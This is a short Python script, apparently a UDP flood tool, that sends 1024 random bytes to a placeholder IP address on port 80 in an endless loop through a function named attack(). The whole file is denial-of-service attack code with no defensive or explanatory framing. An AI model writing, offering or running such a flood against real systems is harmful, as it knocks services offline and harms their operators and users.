import socket
from os import urandom

ip='xx.xx.xx.xx'
port=80

sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #-- UDP

def attack():
    sock.sendto(urandom(min(0xFFFF, 1024)), (ip, port)) #0xFFFF = 65535

while True:
    attack()
